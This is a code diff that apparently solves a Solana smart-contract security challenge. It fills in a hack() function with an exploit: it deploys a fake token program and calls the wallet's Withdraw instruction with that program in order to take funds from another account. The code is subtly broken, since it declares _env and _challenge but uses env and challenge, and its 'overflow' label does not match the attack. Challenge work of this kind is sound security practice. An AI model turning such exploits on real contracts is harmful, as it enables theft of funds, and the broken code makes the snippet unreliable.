@@ -19,7 +19,42 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
+    assert_tx_success(env.execute_as_transaction(
+        &[level4::initialize(
+            challenge.wallet_program,
+            challenge.hacker.pubkey(),
+            challenge.mint,
+        )],
+        &[&challenge.hacker],
+    ));
+
+    let hacker_wallet =
+        level4::get_wallet_address(&challenge.hacker.pubkey(), &challenge.wallet_program).0;
+
+    let authority_address = get_authority(&challenge.wallet_program).0;
+
+    let fake_token_program = env.deploy_program("target/deploy/level4_poc_contract.so");
+
+    let tx = env.execute_as_transaction(
+        &[Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(hacker_wallet, false),
+                AccountMeta::new_readonly(authority_address, false),
+                AccountMeta::new_readonly(challenge.hacker.pubkey(), true),
+                AccountMeta::new(challenge.wallet_address, false),
+                AccountMeta::new_readonly(challenge.mint, false),
+                AccountMeta::new_readonly(fake_token_program, false),
+            ],
+            data: WalletInstruction::Withdraw { amount: 10 }
+                .try_to_vec()
+                .unwrap(),
+        }],
+        &[&challenge.hacker],
+    );
+    tx.print_named("Do overflow first-time");
+}
 
 /*
 SETUP CODE BELOW
